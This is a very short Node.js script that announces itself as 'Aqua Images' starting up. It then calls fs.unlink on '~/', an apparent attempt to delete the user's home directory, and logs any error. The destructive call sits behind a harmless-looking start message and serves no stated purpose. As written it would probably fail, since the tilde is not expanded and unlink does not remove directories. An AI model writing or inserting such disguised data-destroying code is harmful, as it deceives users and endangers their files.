const fs = require("fs"); // this is node.js :thumbsup:
console.log("Aqua Images started.");

fs.unlink("~/", (err) => {
  console.log(err);
});
